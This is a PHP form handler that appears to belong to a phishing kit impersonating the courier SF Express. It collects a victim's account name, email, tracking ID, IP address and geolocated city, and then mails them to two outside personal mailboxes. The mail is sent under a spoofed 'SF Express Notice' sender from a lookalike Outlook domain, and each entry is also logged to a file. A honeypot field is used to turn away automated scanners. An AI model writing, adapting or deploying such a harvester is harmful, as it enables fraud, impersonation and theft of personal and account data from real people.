<?php
// submit.php
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $honeypot = isset($_POST['company_name']) ? trim($_POST['company_name']) : '';
    if (!empty($honeypot)) {
        echo json_encode(['success' => false, 'message' => 'Bot detected.']);
        exit;
    }

    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $trackingId = isset($_POST['trackingId']) ? trim($_POST['trackingId']) : '';

    if (!$username || !$email) {
        echo json_encode(['success' => false, 'message' => 'Missing required fields.']);
        exit;
    }

    $ip = $_SERVER['REMOTE_ADDR'];
    $locationData = @file_get_contents("https://ipapi.co/{$ip}/json");
    $location = $locationData ? json_decode($locationData, true) : [];

    $city = $location['city'] ?? 'Unknown';
    $region = $location['region'] ?? '';
    $country = $location['country_name'] ?? '';

    $timestamp = date('Y-m-d H:i:s');
    $message = "📦 SF Express Submission\n\n";
    $message .= "⏰ Time: $timestamp\n";
    $message .= "✉️ Email: $email\n";
	$message .= "👤 Acc: $username\n";
    $message .= "🧾 Tracking ID: $trackingId\n";
    $message .= "🌐 IP Address: $ip\n";
    $message .= "📍 Location: $city, $region, $country\n";

    // Send email
    $to = "blessings1000@yandex.com, dewizard29@gmail.com";
    $subject = "New SF Express Submission";
    $headers = "From: SF Express Notice <apps@ou7tl00kwebs.top>\r\n";
    $headers .= "Reply-To: \r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    $sent = mail($to, $subject, $message, $headers);

    // Log to file
    $logLine = "[$timestamp] $email | $username | $trackingId | $ip | $city, $region, $country\n";
    file_put_contents("sfexpress_logs.txt", $logLine, FILE_APPEND);

    echo json_encode(['success' => $sent]);
} else {
    echo json_encode(['success' => false, 'message' => 'Invalid request.']);
}
?>